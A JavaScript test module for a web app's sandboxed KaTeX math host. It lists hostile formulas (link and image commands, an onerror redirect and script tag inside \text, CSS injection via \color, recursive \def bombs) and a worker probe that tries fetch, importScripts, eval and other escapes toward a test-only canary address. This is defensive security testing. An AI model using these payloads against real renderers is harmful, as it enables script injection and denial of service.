// @ts-nocheck — plain JS: formulas made to do harm, as any doc could hold one
/*
 * WHAT A FORMULA CAN'T DO — every way out an untrusted formula, and the worker that reads it, would try, tried in the
 * real math host (./math-host.js), as the view probe (./view/probe.js) tries every way out of a view. The probe page
 * (/app/math/probe/) runs them; scripts/probes.mjs runs it headless in Chromium and counts what reached the canary.
 * Every attempt must be refused or stopped.
 *
 * - `hostileDoc(canary)`: a doc's Markdown whose formulas reach out every way KaTeX could (`\href`, `\url`,
 *   `\includegraphics`, the HTML extension, HTML in `\text`), blow up (`\def` bombs, deep nesting, one too long to
 *   send), or name commands KaTeX never heard of; and, beside them, formulas of the paper's kind, which must still be
 *   typeset. It goes the docs' own way: the Markdown engine, then the math host's frozen engine in the page's own shell.
 * - `MEGABYTE`: a formula of a million characters, asked of the host directly, never drawn: the page lays out none of
 *   it (WebKit takes many seconds to break a word that long into lines, which would stall the page by itself).
 * - `probeEngine(code)`: the frozen math engine with a probe after it, in a shell of the probe's own. Asked `probe`, its
 *   worker tries every way out it has (`WORKER_TRIES`), each said as it went; a batch holding `SPIN` never returns, and
 *   its worker must be ended while the formulas beside it are typeset.
 *
 * `canary` is where every attempt aims (`<canary>/<attempt>`): an address only the probe's runner listens on.
 */

/** the formula that holds its worker for ever, in the probe's shell alone (the frozen engine knows no such thing) */
export const SPIN = '\\maiaprobespin';

/** a name only the probe writes: a page or an event that holds it was reached */
export const ESCAPE = 'maia-probe-escape';

/** a formula of a million characters: the host sends none of it (./math.js `LIMITS.tex`) */
export const MEGABYTE = 'x'.repeat(1_000_000);

/** a picture's name in a doc (its hash and ending), so a caption is a figure's as in the paper */
const PICTURE = `${'0'.repeat(63)}1.png`;

/**
 * The formulas made to do harm, each with what must come of it: `source` (no MathML, its LaTeX shown) or `either`
 * (typeset or not, so long as nothing but MathML Core is drawn: HTML in `\text` is only its characters, and a size is
 * held to KaTeX's `maxSize`).
 * @param {string} c the canary
 */
export const hostileTex = (c) => [
	['\\href', `\\href{${c}/href}{\\text{a link}}`, 'source'],
	['\\url', `\\url{${c}/url}`, 'source'],
	['\\includegraphics', `\\includegraphics[height=1em]{${c}/includegraphics.png}`, 'source'],
	['\\htmlClass', `\\htmlClass{${ESCAPE}}{x}`, 'source'],
	['\\htmlStyle', `\\htmlStyle{background:url(${c}/html-style)}{x}`, 'source'],
	['\\htmlId', `\\htmlId{${ESCAPE}}{x}`, 'source'],
	['\\htmlData', `\\htmlData{probe=${ESCAPE}}{x}`, 'source'],
	['HTML in \\text', `\\text{<img src="${c}/text-img" onerror="top.location='${c}/text-onerror'">}`, 'either'],
	['a script in \\text', `\\text{<script src="${c}/text-script"></script>}`, 'either'],
	['a colour that is CSS', `\\color{red;background:url(${c}/color)}{x}`, 'source'],
	['a \\def that calls itself', '\\def\\a{\\a\\a}\\a', 'source'],
	['a \\def that doubles', '\\def\\b{xx}\\def\\c{\\b\\b\\b\\b}\\def\\d{\\c\\c\\c\\c}\\def\\e{\\d\\d\\d\\d}\\e\\e\\e\\e', 'source'],
	['a \\newcommand loop', '\\newcommand{\\f}{\\f}\\f', 'source'],
	['nesting 400 deep', `${'\\frac{'.repeat(400)}x${'}{y}'.repeat(400)}`, 'source'],
	['a space 1000 ems wide (KaTeX makes it 10)', '\\kern{1000em}x', 'either'],
	['a command KaTeX never heard of', '\\maiaprobeunknown{x}', 'source'],
	['too long to send (past 4,000 characters)', `\\text{${'x'.repeat(4990)}}`, 'source']
];

/** the formulas of the paper's kind that must be typeset: inline, display, numbered (\tag), gathered */
export const GOOD = ['x^{*} = \\arg\\max_{x} f(x)\\,', 'E = mc^2 \\tag{1}', '\\begin{gathered} a = b \\\\ c = d \\end{gathered}', 'a_1', 'u/r'];

/** A doc's Markdown: every hostile formula a display of its own, and the good ones inline, displayed, in a table cell and a caption. @param {string} c */
export function hostileDoc(c) {
	const hostile = hostileTex(c)
		.map(([what, tex]) => `${what}:\n\n$$${tex}$$\n`)
		.join('\n');
	const [inline, tagged, gathered, cell, caption] = GOOD;
	return [
		`Inline maths, $${inline}$, as the paper writes it, and raw HTML, which never comes out: <img src="${c}/raw-img">.`,
		`$$\n${tagged}\n$$`,
		`$$\n${gathered}\n$$`,
		`| a cell | its maths |\n|---|---|\n| one | $${cell}$ |`,
		`![The ratio $${caption}$](${PICTURE})`,
		hostile
	].join('\n\n');
}

/** what the probe's worker tries, each said by the worker itself */
export const WORKER_TRIES = [
	'fetch',
	'fetch this site',
	'XMLHttpRequest',
	'WebSocket',
	'EventSource',
	'WebTransport',
	'sendBeacon',
	'importScripts',
	'import()',
	'a nested worker',
	'a SharedWorker',
	'eval',
	'new Function',
	'a timer of a string',
	'WebAssembly',
	'indexedDB',
	'caches',
	'OPFS',
	'BroadcastChannel',
	'an origin',
	"the page's DOM"
];

/** the probe after the frozen engine: its tries, and the formula that never returns */
const probe = (c) => `
;(() => {
'use strict';
const C = ${JSON.stringify(c)};
const engine = self.onmessage;
const say = (m) => self.postMessage([m, []]);
const event = (target, ok, no) => {
	target.onopen = () => ok('open');
	target.onload = () => ok('loaded');
	target.onmessage = () => ok('a message');
	target.onerror = () => no(new Error('error'));
};
const tries = (site) => ({
	fetch: () => fetch(C + '/fetch').then((r) => r.status),
	'fetch this site': () => fetch(site + '/api/me').then((r) => r.status),
	XMLHttpRequest: () => new Promise((ok, no) => { const x = new XMLHttpRequest(); event(x, () => ok(x.status), no); x.open('GET', C + '/xhr'); x.send(); }),
	WebSocket: () => new Promise((ok, no) => event(new WebSocket(C.replace(/^http/, 'ws') + '/websocket'), ok, no)),
	EventSource: () => new Promise((ok, no) => event(new EventSource(C + '/eventsource'), ok, no)),
	WebTransport: () => new WebTransport('https://' + new URL(C).host + '/webtransport').ready.then(() => 'open'),
	sendBeacon: () => { if (!navigator.sendBeacon(C + '/beacon', 'x')) throw new Error('not queued'); return 'queued'; },
	importScripts: () => importScripts(C + '/import-scripts.js'),
	'import()': () => import(C + '/import.js'),
	'a nested worker': () => new Promise((ok, no) => event(new Worker(C + '/worker.js'), ok, no)),
	'a SharedWorker': () => new Promise((ok, no) => event(new SharedWorker(C + '/shared-worker.js').port, ok, no)),
	eval: () => (0, eval)('1 + 1'),
	'new Function': () => new Function('return 1')(),
	'a timer of a string': () => new Promise((ok, no) => { setTimeout('self.__probeTimer = 1', 0); setTimeout(() => (self.__probeTimer ? ok('it ran') : no(new Error('it never ran'))), 300); }),
	WebAssembly: () => WebAssembly.compile(new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0])).then(() => 'compiled'),
	indexedDB: () => new Promise((ok, no) => { const r = indexedDB.open('maia-math-probe'); r.onsuccess = () => ok('opened'); r.onerror = () => no(r.error); }),
	caches: () => caches.open('maia-math-probe').then(() => 'opened'),
	OPFS: () => navigator.storage.getDirectory().then(() => 'opened'),
	BroadcastChannel: () => (new BroadcastChannel('maia-math-probe').postMessage('hello'), 'sent'),
	'an origin': () => { if (self.origin === 'null') throw new Error('its origin is opaque (null)'); return self.origin; },
	"the page's DOM": () => {
		for (const w of [self.parent, self.top, self.opener, self.frameElement]) if (w && w.document) return 'reached a document';
		if (typeof document !== 'undefined') return 'has a document';
		throw new Error('no document in reach');
	}
});
self.onmessage = async (e) => {
	const m = e.data;
	if (m && m.op === 'probe') {
		const said = {};
		await Promise.all(Object.entries(tries(String(m.site))).map(async ([name, attempt]) => {
			try {
				const got = await Promise.race([Promise.resolve().then(attempt), new Promise((_, no) => setTimeout(() => no(new Error('no answer in 2 s')), 2000))]);
				said[name] = 'OPEN: ' + String(got).slice(0, 80);
			} catch (err) {
				said[name] = 'blocked: ' + String((err && err.message) || err).slice(0, 120);
			}
		}));
		return say({ id: m.id, ok: true, out: said });
	}
	if (m && m.op === 'typeset' && Array.isArray(m.items) && m.items.some((it) => it && it.tex === ${JSON.stringify(SPIN)})) for (;;) {}
	return engine(e);
};
})();
`;

/**
 * The frozen math engine's code with the probe after it, for a shell of the probe's own (./math-host.js `mathShell`).
 * @param {() => Promise<string>} code the frozen engine's code, checked @param {string} canary
 */
export const probeEngine = (code, canary) => async () => (await code()) + probe(canary);
